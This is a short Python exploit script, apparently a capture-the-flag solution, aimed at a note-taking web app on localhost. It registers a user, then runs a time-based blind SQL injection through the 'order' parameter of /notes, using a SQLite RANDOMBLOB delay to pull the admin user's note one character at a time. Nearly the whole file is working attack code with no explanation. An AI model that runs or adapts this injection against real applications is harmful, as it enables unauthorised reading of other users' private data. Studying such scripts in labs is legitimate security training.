import sys
import sys
import time
import uuid
import requests

from time import sleep
from urllib.parse import urlencode, quote, quote_plus

from logzero import logger


URL = "http://localhost:5000"
s = requests.Session()

s.post(f"{URL}/registerlogin",
       data={"username": "asd","password":"asd"},
       allow_redirects=False)

s.post(f"{URL}/add_note",
       data={"title": "fix bug", "body":"need a note to request notes"},
       allow_redirects=False)

#ENCRYPTED:Q05MdWs0ZHJTY0xFbW9uWVZhNDE3UT09OjlKWFVoUWlxNFRQcGpQZmVVcXh1bHdIRitYQ0k6TGhacnRRNGdpckhyR0ErOFVBR05wdz09
extract = ""

for i in range(0, 150):
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+/=:":
        t1 = time.time()
        payload = f"{URL}/notes?order=asc,(CASE WHEN (select substr((select body from notes where user=(select uuid from users where username='admin')),{str(i)},1) = '{str(c)}') THEN 42=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2)))) ELSE timestamp END) desc --"
        r = requests.get(payload, cookies=s.cookies.get_dict())
        t2 = time.time()
        delta = t2 - t1
        #print(r.text)
        #print("delta", delta)
        if delta > 0.1:
            extract += c
            print(extract)

print("Extracted:", extract)
